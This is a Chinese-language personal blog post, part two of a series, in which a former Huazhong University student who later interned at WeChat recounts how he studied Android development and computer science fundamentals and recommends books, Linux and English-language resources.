[{"title":"从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（二）过程——技术学习与个人成长","date":"2020-07-25T07:07:32.000Z","path":"2020/07/25/university_2/","text":"写在前面首先原谅我用这样的标题来博得关注和点击，因为思前想后也只有我所拿到的Offer才最能在一定程度上代表能力，为我下面将要分享的内容作背书。 在最开始准备写这篇文章的时候只是想像往常那样放在我的博客上作为自己的回忆和总结，不太想去获得别人的关注；但另一个声音告诉我这些东西和之前的技术文章不太一样，这些经验和教训可能可以帮助到很多刚刚踏入校门的新人们，或多或少地产生一些价值。 既然决定了写这篇文章是为了创造价值，那么只有分享出来，让更多感兴趣的人看到才能创造更多的价值，这就是此时此刻你能看到这篇文章的原因。 由于文章的篇幅已经远超最初的预想，所以会拆成几篇分别在微信公众号VirMe发出（确实是公众号最适合创作与分享，还烦请关注），所有文章共用开头部分，特此说明。 个人介绍笔者2016年高考考入华中科技大学计算机科学与技术专业，同年10月份加入学生技术团队联创团队Android组，后任组长。 2017年底（大二寒假）拿到今日头条（字节跳动）深圳研发中心Android开发实习生Offer，在深圳研发中心实习至2018年3月。 2018年4月加入新成立的今日头条武汉研发中心实习，2019年5月离职。 2019年春招拿到腾讯（微信）、蚂蚁金服（支付宝）、Airbnb的暑期实习Offer，2019年7月加入微信实习。 2019年秋招拿到字节跳动SSP（抖音）、微信***（转正）、猿辅导SP（斑马英语）校招Offer，最终选择留在微信，目前仍实习在职。 在我的大学四年中，有四年的Android开发经历，两年半的实习经历，有两款Google Play上架的应用，个人原创技术博客也收获了25w+的访问量，当然，最重要的是最后拿到了自己满意的Offer，也算是给大学生活画上一个比较完整的句号了。 文章目的上面介绍的经历并不是为了显示我的经历有多牛逼，事实上在我认识的范围内我的经历还远远谈不上出彩。当我刚刚考入大学，进入我心仪的计算机专业时，觉得提升自己的技术、加入BAT这样的大厂就是我的目标，这也由此指引了我大学生活的方向。相信很多无论是不是刚入学的新生、也无论是不是计算机专业，都有着像我那时的想法。很幸运的是我在非典型的大学四年中找对了方向，也找到了方法，收获了很多的经验与教训，最终达到甚至稍稍超出了自己当初的立下那个目标。 现在回想起来，这很大程度上要归功于给我提出建议、给我指引的前辈们，没有前人的经验我们很难找到正确的方向与方法，以至于陷入无谓的迷茫与焦虑之中。当然在这过程中，也从自己的经历中认识到很多“假如我早点知道该多好”的问题。我所在的华中科技大学联创团队（学生技术团队）有着近20年的历史积累，通过前辈的方法与经验的传承，近年就业的队员几乎是人手几家大厂SP Offer，我想这些方法与经验应该是行之有效的，也是值得与大家分享的。 我写这篇文章的目的也正是在此，一是为了总结自己的大学四年；二是给有着和我一样的目标的同学们一些参考和建议（包括对应届生比较实用的面经），希望可以给读到这篇文章你们一些帮助，希望你们也可以达到自己的目标或是在追求更高的目标的路上更进一步，也算是作出一些微小的贡献；三也是为了帮助大家更好地认识客户端开发这个现在普遍认识不足却有着极大缺口的方向，也是给我所在的联创团队、微信团队打打广告。 虽然文章标题写的是客户端开发之路，但是文中80%以上的内容都是对于技术学习方向比较通用的内容；同时，本文主要面向毕业直接工作的同学，所以不会涉及到读研、出国相关的内容。 最后，本文表达的内容都是一些自己的看法，也仅代表个人的观点，受文笔和经验所限，表达不当之处敬请包涵，也恳请经验更加丰富的前辈多多指正。 正文大学四年的经历很长，总归不是三言两语就能表达清楚的，每个人所处的阶段不同可能感兴趣的内容也不同，为了保证阅读体验，会主要分为三篇文章（非通用内容和一些书籍推荐等会后面另行发出）： 对刚进入大学、想要在未来从事开发工作的大一大二新生的一些建议: 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 如何在大学阶段学习计算机并获得快速的技术成长 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（二）过程——技术学习与个人成长 关于实习；如何准备面试、在面试中展现自己以及最终的选择 本文是其中的第二篇，其他文章敬请关注公众号VirMe。 （二）过程——技术学习与个人成长由于本文篇幅过长，层级也比较多，为了避免逻辑混乱和阅读困难，先在这里列出全文的大纲，大家可以先大致了解全文结构和内容。 最重要的一点：付出大量的时间这是前文说过的团队要求在队时长的内在原因，也是在大学直至以后想要在一个领域取得进步和成就的核心点。这其实也是一句“正确的废话”，勤能补拙、奋发向上、量变引起质变的例子和大道理我们从小不知听过多少遍，但实际上，对很多人来说，这是一个典型的“道理我都懂，但就是做不到”的例子。 很多人都是靠着高中及其之前的勤奋与努力在高考中战胜了大部分的人考上现在的大学的，很多人也是听着“现在吃点苦，考上大学就轻松了”的所谓鼓励支撑自己度过了高中艰难的时光。 但大学有的只是自由，轻不轻松则完全取决于个人的目标。有人的地方就有着竞争，大学的学习中能体会到的竞争不像高中的分数排名那样直观与残酷，只要不挂科，我想大部分的情况下都不会有任何外部的压力。如果你的目标是顺利毕业，以我在华科的体会，课外的时间多到一天能打8个小时游戏的同时可以顺利毕业，确实这样的人也不在少数，不过人各有志，目标和行动匹配就好。但我相信点开这篇文章的你目标应该不在于此。 失去了高考这一明确的目标，外在的环境也不像高中那般竞争激烈，大学里也没人会管你勤奋与否，自由宽松的环境造成了很多人失去了前进的动力。很多人大一时还借着高中的惯性踌躇满志，买书籍做计划，希望在大学里大展身手，不出一年的时间发现自己好像不用那么努力也不会有什么问题，于是就开始把大把的时间花在了游戏上，最终与自己当初的目标相去甚远，毕业时泯然众人。可能在这里说得有些夸张，但我所见到很多人的情况确实如此。 所以为了在就业时激烈的竞争中可以取得优势，在这里必须强调付出时间的重要性，没有足够的时间的投入，下文将要说的一切方式方法都是空谈。同时，也希望大家能够明白，投入的时间越多，你能获得的优势就越大，可能比别人多投入200%的时间，你就能超越80%的人，但如果想成为最突出的那批人，你需要付出的时间会是别人的1000%或更多。千万不要相信所谓的“他这么厉害是因为天赋，是因为加入了团队”，以我所见到的，在最后获得了不错的Offer的人无一不是花费了大量的时间和努力的。 我在大一加入团队后，整个大一只因为班级聚会出过两次校门，印象深刻的是每天骑车背着十来斤的游戏本来回相距3公里团队与教学楼好几趟，进了大学后第一年反而瘦了十斤。大二实习后，除去每天朝十晚九的工作时间，回学校后也会再学习两三个小时，基本上都是一两点再回寝室睡觉，和保研的室友一学期也见不着几回面。 也是因为我相信我付出的时间远远超过大部分竞争者，在大三找工作的面试中才能有比较难得的自信，也让我敢厚着脸皮在这里写一些东西与大家分享。 当然也不是说大学生活的全部就应该是学习技术，我也因为对这些的投入牺牲了很多其他东西，这是我的选择，但大学中确实还有很多技术以外的事情值得我们去尝试，在最后再来谈这点。希望下面的内容可以对你的技术成长起到帮助。 应尽早知道的事情：方法与效率既然想要获得技术成长就一定要付出时间，为什么有的人已经花费了很多时间但是没有相应的成长，不同人付出相同的时间能获得的技术成长是不是相同的呢？显然不是。因为真正获取到的东西=时间x效率，效率在很大程度上影响了最终的产出。 而对于计算机的学习来说，不同人之间效率的差距极大，有时候会有数倍之多，这就造成了花同样的时间，一些掌握方法、效率极高的人学到的知识/完成的项目会是其他人的数倍。尽早知道这些方法，意味着尽早积累优势，一些受用终身的东西可以帮助你在漫长的职业生涯中获得极大的回报。很多理念包括提升效率这点本身很多人工作多年后才能意识到，却是大学中团队mentor教会我的第一课，所以与前辈交流经验是很重要的。 在这里，我就将我和团队所受用的一些方法和理念分享给大家。 接受一手资料刚进入团队的新人都会有着一个相同的第0期任务：配置上网环境（上Google，你懂的）、安装Linux与Linux下开发、使用hexo搭建博客。在第一次新人期的CodeReview时，我的mentor顺手就打开了Google，将我的语言设置成了英文： 团队一开始会告诉新人的是：尽可能使用Google，使用英文，阅读英文资料。 熟悉英文环境熟悉英文环境的理由很简单：绝大部分计算机领域的一手资料都是英文的，几乎所有经典的计算机书籍都是英文版翻译过来的；Android的官方文档近几年才开始支持中文（抛开翻译质量不谈，有更新的内容一定是先有英文版的），大部分常用开源库的文档只有英文版；更不用说一些新一些的技术了。如果为了方便和一开始的速度而不去熟悉英文环境，除了要面对参差不齐的翻译质量，到了只有英文资料提供的时候就会变得捉襟见肘，非常影响效率。一开始上手时可能会因为生疏导致阅读速度较低，但只要经过一段时间的适应后，阅读速度和能力都会有快速的成长，更可以开始体会很多翻译所完全丧失的原作者的机敏与幽默，会感到原版的内容读起来更加地流畅与易懂（例如英文版的计网-自顶向下和中文版简直是两本书）。 此外，为了与老外交流，比如去github提issue、去Stackoverflow提问与回答，英文也是到了一定阶段后不可或缺的技能，所以团队也要求代码的注释、git的commit message等也全部用英文。 不要担心你的英语水平不够阅读这些资料，Mentor原话是“你能考上大学的英语水平就足够了”，技术类的文章其实语言很直白，难度低很多，也完全不需要另外专门去学习，直接上手就是最快的办法，很多生词查几回就熟了。本人高考英语16年全国卷132分，从大一开始尽可能阅读英文后到了大二基本上适应了英文环境，之后基本上都是有英文原文绝不看翻译版。 使用Google搜索资料与文章是我们除了看书以外学习技术和解决问题的另一大来源，在Google之前有统计的时候团队有学长统计过年搜索次数可达到1.2万次，而搜索结果的质量很大程度上就决定了我们能否找到正确的答案和接受的内容质量。但在英文搜索方面，百度确实做得远不如Google。 首先，百度的搜索结果是为中文优化的，所以即使你搜索的关键词是纯英文的，得到的结果也大部分会是中文的关联性不强的内容，而Google在设置为英文结果后则不会有这一问题，基本一搜一个准，在一些情况下Google也会展示部分高质量的中文内容。 其次，由于国外部分技术网站无法访问（包括Android的官方文档和间歇性失联的github），所以百度对这部分网站内容的索引很少，比较明显的是Google搜索各种类/接口/方法出现的前几条结果一定有官方的文档页面（也是最为推荐的了解类库的方式——阅读文档），而百度则是各种博客平台中质量参差不齐的文章（有些时间非常久远，也存在到处转载的重复文章）： 虽然CSDN、简书上不乏高质量的博主和文章，奈何低质量的内容实在太多，需要花大量的时间甄别，而官方文档始终是最权威的资料来源，但很多所谓的Android开发者却从来没有打开过官方的文档和guide页面。 更不用说百度检索不到github的issue、Google issuetracker等这些非常实用的查问题的地方，对Stackoverflow这个几乎能找到所有常见问题的网站的检索能力也很弱，但很多问题确实只有在这些地方才能得到解答： 更为搞笑的是，国内还有网站钻起了Stackoverflow上都是英文内容、不便搜索的空子，直接爬取问题和回答再机翻出来，污染了搜索结果： 类似的例子数不胜数，就不再举例了。总的来说，熟练使用Google和英文环境，可以很大程度上提高信息的获取效率，更是对解决实际问题有着极大的帮助。 重视工具这部分想讲的是要重视工具的使用以提高开发效率、节省开发时间。工具的含义很广，从我们使用的IDE、编辑器，到操作系统甚至是硬件设备，都是我们开发时会使用的东西。为什么要重视工具呢？因为工具带来的效率提升往往是最为直接的，举个简单的例子，假如你编译一次代码需要10分钟，学会使用make、ccache等工具后编译时间下降到了5分钟，一天编译十次，就节省了50分钟的编译时间，非常直接有效。 IDE与快捷键那么可以从哪些方面入手呢？首先就是学会使用IDE和快捷键，像Android Studio这种IDE从接触Android开发起几乎是形影不离，其强大的功能如果不主动去学习很难了解全面。在我第一次见到mentor如何使用IDE的时候几乎目瞪口呆，各种跳转、重构、代码生成等让我意识到如果不学会这些操作，将会在低下的效率下浪费多少时间。所以非常有必要花上一些时间全面地了解你所使用的IDE的功能，方法也很简单，点开最上方的菜单，一个一个地了解、试验其每一个选项的作用并在以后的使用中加以运用，相信你一定会受益良多。 虽然写代码大部分的时间应该在思考而不是打字，但得心应手地使用IDE依然可以帮助我们流畅地编码，节约很多开发时间。 Linux前面提到过团队新人的第0期任务之一就是安装Linux与Linux下开发，大部分人可能都听过Linux，但是从来没想过要主动去使用它，更别说作为主力操作系统日常使用。 我在大一刚入学的时候为了安装Linux（而且是团队推荐的比较激进的Arch Linux），整整用了两个礼拜，也是因为第一次尝试靠着官方的文档，在什么基础知识都没有的情况下摸索着安装，期间也不知推倒从来了多少次。也是这段经历驱使我后来写了篇如何安装Arch Linux的博客，意外收获了十几万的浏览量。当然像是Ubuntu这种更加大众的发行版的安装就不会有这么困难，基本上都是一键安装了。 从安装Linux后，我就基本上抛弃了windows，开始使用Linux作为主力操作系统进行后面的学习和开发，直到实习后转向macOS（真香）。事实证明，Linux是一个对开发者非常友好的操作系统，深入使用Linux可以带来很多好处，同时，熟悉Linux环境也是计算机专业毕业生必不可少的技能。 首先比较直观的，windows下比较头疼的开发环境配置问题在Linux里基本都是一行命令就能解决的，包管理器会帮你处理所有的依赖项和对应的配置，有着庞大的开发者群体，基本上碰到的系统/环境问题都可以很容易找到解决办法；字体渲染比windows好很多，看着舒服；不用像windows那样用ssh、git这种命令行工具都需要下载专门的客户端，Linux的命令行环境非常强大，利用shell编程，配合各种命令行工具，就可以非常方便的进行各种操作，在效率上会远高于windows下使用图形界面完成相同的操作；对于后台方向的同学来说，在Linux上部署服务、熟悉UNIX编程更是基础技能。 更重要的是，Linux继承自UNIX，几乎是伴随着操作系统的进化而来，有着完全开放的源码、架构和独特的设计哲学。它化繁为简，比起windows的黑盒来说更加透明、干净、简洁，从中你可以了解操作系统运行的每一部分：网络、内存管理、文件系统、进线程调度等。借由这实际且成熟的操作系统，可以帮助我们理解、学习相关知识，大学课程中知名的高质量实验如CS:APP（深入理解计算机系统）的lab、MIT 6.828的lab、南大的ics-pa等无一不是建立在Linux环境的基础上的。 与IDE类似，对于这种每天都要长时间接触、使用的工具，花上一些时间配置、熟悉所带来的效率提升是非常划算的。在安装完Linux后，我又在差不多两个月的时间里没事就折腾桌面环境、配置各种快捷键，当完全熟悉以后就发现自己再也回不去windows那死板的、毫无提升潜力的桌面环境了。 对于Android开发者，学习Linux的过程也就是对Android底层所依赖的Linux层面的学习过程，对Linux的理解越充分，对Android整体设计和与系统紧密关联的部分的认识就越充分。举个典型例子，Android的整套权限系统其实就是基于Linux的文件权限系统实现的，通过巧妙的用户和组的设置从内核层面保证了安全性，又避免了重复造轮子，非常简洁与优雅。 说了这么多，还是为了向大家推荐去尝试Linux，更希望可以将Linux作为自己的主力系统（macOS当然也行，但是还是有朋友在mac上装Linux用的……）。Linux远没有想象中的遥不可及和难以掌握，还是那个道理，虽然有学习成本，但其能带来的知识和效率上的收益会远远超出付出的成本。 再谈效率程序员是非常注重效率的群体，很多人都对工具与开发环境有着执着的追求，在公司的大团队里一定会有人专门来研发工具和优化流程，提高所有人的开发效率。因为效率意味着在有限的时间成本中获得更大的收益，并且是改善的越早，累积的收益就会越大。 对个人来说也是如此，一旦当你发现有什么事情阻碍了你的学习/开发效率的时候，就应该意识到要去想办法改进；也要多关注、交流，了解可以使用什么工具或是方法来提高自己的效率。效率不是一切，但一旦你有了对效率的追求，就可以在成长的道路上不断提速。 基础知识的重要性及如何学习在前文中已经非常多次强调了基础知识的重要性，基础知识主要指一些计算机科学中较为基础、通用的知识，包括被称为“四大基础”的计算机组成原理、算法与数据结构、操作系统、计算机网络和其他例如C语言、汇编、数据库、计算机体系结构、编译原理等。 可以发现这些都为计算机专业开设的课程，具体学校、学院会根据侧重不同开设数电、模电等偏底层的课程或是游戏开发、面向对象编程等上层课程，这部分课程可以根据兴趣选择深入程度，优先级会比前面这些通用的课程低一些。 在回答应该花多少精力学习基础知识时，我的回答通常是四个字“往死里学”。基础知识的重要性可以体现在以下几个方面： 基础知识决定了学习能力和深度学习能力整个计算机的知识体系其实很像计算机网络里面的分层模型，每一层都只关注这一层应该做的事情，在低一层提供的抽象的基础之上进行开发的同时为高一层提供抽象接口。计算机从最基本的硬件（数电/模电）开始，到计算机组成原理如何用电路组成基本的冯诺曼依体系计算机，到ISA指令集提供软硬件接口，到操作系统形成对硬件的管理和抽象，再到编译原理、汇编语言等打通高级语言与可执行程序间的鸿沟，最后到我们日常所接触的上层应用的开发。 以华科为例，教授这些知识的顺序通常会从高级语言层面、最容易理解的C语言开始， 因为学习语言不至于太过枯燥，也可以尽早培养最基本的编程能力。但是因为一开始所学的C语言已经是较为上层的知识，没有底层的知识背景，通常是很难学明白的。 就像是绝大多数人（包括我）在一上来就学习C语言的时候，会面对编译时的错误和运行时的SegmentFault等感到头疼，因为没有编译原理/编译器和操作系统的基础知识，我们只能选择查阅资料或者请教别人来直接找到解决的办法，而对其真正发生的原因一无所知；也会对类似于指针和地址的概念感到难以理解；更不用说理解堆上内存分配和函数栈帧这种概念了。 而对基础知识的学习，就是建立完整的知识体系、更加深入地理解计算机（程序）工作原理的过程。一旦学习了汇编语言，对C语言到汇编的对应关系有了了解以后，就能很容易地理解指针是以什么形式存在和被CPU所理解的，这个时候就会对C语言的认识更加深入与清晰。同时，汇编语言又会帮助你在后面的课程中理解操作系统的启动、编译的流程等等知识。 这是一个滚雪球的过程，对已有知识的充分理解，可以帮助你在能更加容易地学习新的知识的同时不断巩固和加深已有的知识，最终雪球越滚越快也会越来越大。计算机的学习曲线就是一条开始缓慢，而后不断提速直至达到一个人理解能力的极限的曲线，基础知识扎实的同学的学习速度和理解能力会远远超出基础知识不牢靠的同学，拉开越来越大的差距。 如图所示，可以认为学习能力=学到的技术能力/花费的精力，而大约50%的人由于没有对基础知识足够重视，一直会处于开始时很低的学习能力水平；有大约30%的人在学习完大学所有的课程后意识到基础知识对于学习的帮助，但毕业也意味着失去了最佳的学习基础知识的时机，毕业后很少会有大学中这么完整的时间沉下心来学习基础知识；同时有20%的人毕业时在基础知识上的积累已经越过了开始时增长较慢的过程，达到了较高的水平，这样的知识积累对毕业后的技术成长是非常重要的。 我在大学中的切身体会就是我把一批人远远地甩在了后面，而在我前面的人同样遥不可及。而这些走在最前面的人通常就是大学之前已经积累了很多计算机知识，入学时的学习能力已经甩开其他人一大截的人。在花同样的时间的前提下，在短期内他们的知识水平会一直比我们高，并且差距也会越来越大。 技术深度更强的学习能力可以带来更深的技术深度，但基础知识对技术深度的影响还不止于此。 对于Android开发而言： 技术深度一部分体现在对Android系统底层的理解上，理解了底层的运作才能对应用的行为有更全面的了解、解决一些应用层面很难理解的问题，才能根据底层的原理进行针对性的性能优化。而Android底层就是我们所熟悉的Linux，对于操作系统的认识在这里完全适用，另外，也需要有非常多的基础知识才能理解应用的运行时环境JVM，知道其是如何运行我们的应用代码并作出优化的。 技术深度的另一部分可以体现在对软件架构的设计能力上，而操作系统、计算机网络、数据库系统等课程中的设计理念和原则都是非常经典和优秀的，对这些系统设计的学习可以潜移默化地提升我们的软件设计能力。当时读到Android系统源码中对于输入事件的处理代码时，突然发现这不就是组成原理中CPU流水线的设计吗，后来来微信以后也在代码中发现了类似的设计，这就是优秀设计的魅力。 这两点放在其他开发岗位也是大同小异，你所写的代码总会运行在底层所提供的环境之上，对于底层环境的理解需要的往往就是更多的基础知识，同时基础知识中经典的设计也可以有助于设计出更好的代码架构。这就是基础知识对于技术深度的重要性。 基础知识是面试时的重中之重在我所经历的面试中，越是能力要求高的公司/岗位，对于基础知识的考察就越重视。很多人不能理解，基础知识大家都知道会考察，考察的问题也大同小异，为什么这些面试官还会不厌其烦地问这些问题？ 对于每个刚从大学毕业、想从事开发岗的候选人来说，无论是否是所谓科班出身，通用的基础知识一定是衡量大学中对于计算机知识的掌握程度的最佳标准。一是所有人都会去学，不会出现刚好问到没接触过的方向的情况；二是对于基础知识的考察非常容易分辨真实水平，虽然面经网上一抓一大把，问题也就那么几个，但对于基础知识的掌握程度更多的靠的是前面所说的，不同知识间的相互印证和加深。同样一个问题，或许靠背诵准备好的“标准答案”可以说个大概，但只要面试官一旦再往下深入一步，或是提及相关的知识，就非常容易看出来到底是对这些知识有深入理解和关联还是只背过面经。 举个例子，“进程和线程的区别”是操作系统的一道非常经典的面试题，很多人都能轻松背出这个标准答案：“进程是操作系统资源分配的基本单位，而线程是任务调度和执行的基本单位”，但深入一步问“操作系统为进程分配了哪些资源？”，“操作系统为什么要进行线程调度，是如何进行的呢？”，这就不是大多数人能答得出来的了，更不用说面试官可以一步步深挖，直到知道面试者的认识极限。对如此庞大的知识体系的考察，决不是靠面经就能应付过去的。（百度搜了下这个问题排名第一的CSDN文章竟然是错的……） 为了提前对面试者的基础知识进行筛选和节省面试投入，现在各个大厂都会进行笔试进行考察，也非常流行进行交叉面试，让不是这个方向的面试官考察通用能力。事实证明，基础知识牢靠的面试者会非常容易得到面试官的好评，通过率也往往非常高，毕竟语言和具体的开发方向工作后都可以慢慢学习，唯独基础知识是必须在大学中才能学好的。明白了这一点，又怎会不去重视大学中基础知识的学习呢？ 如何学习基础知识花了这么大的篇幅介绍基础知识的重要性，还是想让大家从心里认同基础知识的价值，这是开始学习的第一步：弄清楚为什么要学，这样才不至于在这个过程中感到迷茫和动摇。下面就介绍一些我对于基础知识学习的经验。 关于学校开设的课程前面说过，我们要学习的基础知识在大学中几乎都开设了对应的课程，那么是不是跟着学校教授的进度走就行了呢？答案是学校教授的基础知识对我们来说应该是远远不够的。 首先大学目前开设的课程的学时远远不足，以华科为例，像是计算机操作系统这种核心课程的学时也只有64，这么短的时间内想要把操作系统弄清楚是很困难的，事实上做完MIT 6.828这种优秀的操作系统课程的实验所需要花的时间可能都不止64个小时。受限于学时的限制，老师也不得不省略一些较为深入的内容，而只能关注于把关键部分讲清楚，像是组成原理这种课程，课上所会教授的部分其实只有《计算机体系结构——量化研究方法》这本书内容的附录部分。而想要真正完整、全面地认识一门基础课程，光靠课堂上的这点时间是远远不够的。 其次，目前大学中开设课程所用的课本绝大部分还是国内自编的，非常不推荐从这些课本开始学习基础知识。第一还是由于课时所限，课本的相关内容也是经过选择的，并不能代表这一课程的全部内容；其次这些课本的年代也已经比较久远了，很多内容放在现在其实并不适用；最后还是因为这些课本本身不够权威，内容也没有经过广泛认可，很可能存在不正确的地方。刚开始学习一门课程时的第一印象很重要，否则错误的认识将会伴随后面的整个学习过程造成更多的错误认识。关于如何选择书籍，下节集中讲。 最后，学校开设课程的进度因为通识课的存在通常比较滞后，华科的操作系统和计算机网络等核心课程要等到大三才会开设，而这个时候通常已经到了马上要准备春招找实习的阶段了，所以对于就业的同学来说，提前学完这些核心课程是必须的。 因此，在大学的课堂上，我几乎都在自己阅读该课程对应的权威书籍，在课外的时间会选择另外一门基础知识同时来学，以提前积累一定量的基础知识，到了真正开设这门课的时候，通常还会再从头把书再看一遍，因为这时其他课程的知识一定可以帮助你重新认识很多知识点，也是为了准备课程的考试。 很多面试官也问过我，“你这么早出来实习，学校内的课程怎么办？”，其实这个问题就相当于说：“你不去上学校的这些基础课程，基础知识能保证吗？”。我的回答也很直接，我不去上课不代表不学，更不代表在基础知识方面花费的时间会比其他人少。事实上我在每一门专业课上花的时间会超过大部分的同学，在专业课上也是在零平时分的前提下平均分在90分左右（考试接近满分，老师不会为难你的平时分的）。这里不是鼓励大家翘课去实习，这么做的前提是你对自己学习基础知识的能力和投入有充分的保证，不然只能是得不偿失。 书籍选择其实现在选择书籍已经很容易了，因为已经有很多书籍已经经历时间的考验，被大家所普遍认可，只要在知乎这种平台搜“XXX(课程名) 书籍”，高赞的回答取个交集基本就是候选的书了，但是这里还是要注意选择，因为很多书籍确实非常权威和全面，但是并不适合入门时阅读，比如C语言方面有人推荐《The C Programming Language》这本由C语言发明者和Unix宗师所著的书，但这本书并不面向初学者而编写。相比之下，更加适合的是《C Primer Plus》这种既权威，又为初学者考虑的书籍。千万不要为了追求所谓的“一步到位”而选择前者这种需要一定基础的书籍，这类书籍待到对其他方面的知识有了一定量的积累以后再来看，才会有较为透彻的理解、达到最佳的效果。 实在纠结不知道选哪本，那就都买来对照着看吧，反正学习基础知识，永远不嫌多。 同时，正如前文所介绍的，在有英文原版的情况下（机械工业出版社的黑皮书和人民邮电出版社都会出版对应的英文版，很良心），非常推荐看英文原版，上手以后无论是阅读质量和理解程度都会有一定提高，也是帮助自己熟悉英文环境。 我看的第一本原版书籍就是人民邮电出版社的《C Primer Plus : 英文版（第六版）》，当时是在刚进入大学时就看过这本书的中文版，后面开设C语言课程的时候又买了这本原版再看了一遍，确实帮助很大，如果一开始觉得英语能力不够的可以下个中文版的电子书对照着看，看完这一本以后基本上后面的英文书籍阅读就没什么障碍了。 具体的学习路线？其实路线这个东西就因人而异了，每个人感兴趣的东西不同、学习习惯也不同，选择的路线只要能让自己能投入时间不断学习就行了，但是在这里还是强烈推荐一些书籍和计划： 在大一上学期学完： C语言：推荐《C Primer Plus》 数据结构与算法初步：推荐《数据结构与算法分析——C语言描述》和人民邮电出版社的《算法（第4版）》（这本书虽然名字叫算法，讲的大部分还是和数据结构非常密切的，同时在Coursera上有普林斯顿配套的Algorithms课程，有详细的讲解） 汇编语言：强烈推荐王爽的《汇编语言(第3版)》，深入浅出，配合附带的实验对学习汇编语言非常有帮助 在学完上面的基础后强烈推荐在大一到大二上学期的时间内看完《深入理解计算机系统（原书第3版）》，也就是大名鼎鼎的CS:APP，这本书在知乎等平台备受推崇，书名看上去也非常高大上，容易让人误以为这是一本非常高阶的书。但事实上这书的英文名直译过来也就是“计算机系统：一个程序员的视角”，来源于CMU给大二学生开设的基础课”Introduction to Computer System(ICS)”，是很多后续课程的前置课程，对能力背景的要求也仅有基本的C语言和汇编的知识（没有也不要紧，书里还会教……），所以最适合阅读的时机就是大一大二。这本书的优点我在这里不再多说，“价值超过等重量黄金的无价资源宝库”这样的评价丝毫不会夸张，这是技术书里第一本能让我读起来感到非常“爽”的书，读完以后你会第一次认识到计算机到底是如何工作的，虽然不是非常深入细节，但是这样的宏观认识可以极大地帮助你后面深入的学习。在这里想说的是，这本书大多数人都听过，甚至都买来读过，但是真正能把它读完的人却很少，更不用说做完这本书精髓的11个Lab的人更是凤毛菱角（很惭愧我也没能做完）。首先因为这本书的体量很大（我买的原版足足有1000多页，拿着就像两块砖头），需要花大量的时间阅读，其次是其中有的章节在缺乏背景的情况下读起来确实会比较吃力（例如第四章处理器架构大部分人都会选择跳过去，不过这本书绝大部分内容已经写得非常通俗易懂了），劝退了不少人。其实我认为这书里的内容完全搞懂是不太可能的，因为它只是个Introduction，让你形成宏观概念，引入你深入学习，这本书的目的就达到了，所以对于不懂的地方大可先跳过，之后总会有一天反应过来原来如此的。而这本书的Lab是非常推荐在假期花上一整天的时间去做的，这几个Lab都是实验中非常难得的精品，在与知识深度结合的同时又不缺乏趣味性和挑战性（Bomb Lab拆炸弹、Attack Lab做攻击），就像是游戏一样。相信我，尽早看完这本书和做Lab，会让你受益匪浅。 再往后就是几门经典课程了，有了CS:APP的积累，我觉得以什么顺序来学问题不是太大，大多数情况下也是几门一起学的，这些核心的课程除编译原理外建议在大二完成： 计算机操作系统：《现代操作系统》、《操作系统设计与实现》、《操作系统：精髓与设计原理》、《操作系统概念》这几本书其实各有优劣、评价褒贬不一，我看的第一本是《现代操作系统》，其他几本都是翻过一下，可以根据自己的兴趣选择，大不了还是都看一遍……如果觉得还不够的话可以试试《Linux内核完全剖析》等偏应用的书籍。另外推荐MIT 6.828的配套实验和南大的ics-pa，都是非常精品的实验。 计算机网络：推荐清华大学出版社的《计算机网络》和英文版的《计算机网络: 自顶向下方法》（这本书翻译实在太烂，中文版不推荐）。前者是自底向上的，可能一开始比较难理解，后面几章就好了。后者可以作为参考或者看的第二本书。另外，方向相关想要继续深入的同学后续可以看《TCP/IP详解》这套书。 计算机组成原理：推荐也是神作的《计算机体系结构：量化研究方法》，这本书比较偏硬件，可以根据自己情况选择性读（我也没有读完）。 编译原理：机械工业出版社《编译原理》，也就是久负盛名的“龙书”，有些学校把编译原理作为选修课，我觉得作为计算机专业本科的封顶课程，是非常有必要学习的。有的同学可能觉得，我又不从事编译器相关的工作，学编译原理有必要吗。其实编译器要解决的问题就是搭建用户语言与机器语言间的桥梁，也是一个将一种表示方式转换为另一种表示的通用问题，虽然编译器是特殊的，但其能解决的问题是通用的，它解决问题的方式和思路也是经典和优秀的，这些东西都值得我们学习。在微信实习的学长和我其实都用到了编译原理来解决一些问题，其实它离我们的日常开发并不遥远。 遇到问题对于这些基础知识的学习过程并不轻松，时常会碰到不能理解的知识点，我的习惯是一般会先跳过这些点，有些是知识点的编排问题导致后面才会解释的概念提前出现，看到后面再回过头来自然就能理解了；另一些情况确实是书籍讲解的不够细致，比较直接的办法是直接搜索相关文章、博客、问题等帮助理解（有些专门针对于一个技术细节的文章讲得会比书中详细得多），麻烦一点的话就是找其他书的对应部分做参照，如果还没有找到答案，我觉得大概率这个问题其实并不重要，有时候过分关注于细节就是一种浪费。 一方面是不懂的地方可以暂时跳过，另一方面是如果一本书读完还觉得云里雾里，完全没了解到这门课程的内容，那么绝对不能就此罢休，可以换个课程学一段时间再回过头来再细读一遍，或者干脆就换本书继续学。还是前面所说的，基础知识值得我们“往死里学”。 基础知识之外花了这么多的篇幅讲基础知识，那是不是把所有的学习时间全放在基础知识上就行了呢？虽然可以这样，但是纯粹的基础知识的学习有一个弊端是过于理论，除了几个精品的实验之外就几乎没有实践、编码的机会了，这样的学习过程会比较枯燥，不容易长期坚持如此。所谓实践出真知，总得来看纯粹的理论学习还是不利于自己对于知识的理解掌握与应用的。 另外，由于计算机的毕业生也越来越多，企业对毕业生的要求除了“基础知识扎实”之外也开始要求“有相关开发、项目经验优先”，对于想要拿到比较好的Offer的同学来说这更是必要条件。就像上一篇文章所讲的那样，大学中从零到掌握一个方向的内容都不太可能，公司里的开发岗位也通常也是按方向设置的，所以在大学中还是要深入一个方向，把这个方向做深做精会更有利于就业的同学。具体如何选择方向请见上一篇文章。 所以，清楚基础知识重要性的同时，还要协调好对自己方向相关内容的学习和实践。我大一的时候这两者所花费的时间大约是一比一，在团队的时间基本上都在做项目、写Android；上课和其他时间基本都会用来看书学基础。到大二大三如果有项目/实习的时候基本上大部分都会在开发上，周末或者晚上空下来的时候就会抓紧学基础，甚至一段时间没看基础的书就会有一种莫名的罪恶感……对我来说学习基础知识反而成了代码写累了的时候的一种消遣，能静下心来看书的时候不多，抱着享受的心态来学习的感觉是很不错的。 下面就介绍一些基础知识学习之外，应该重视的事情。 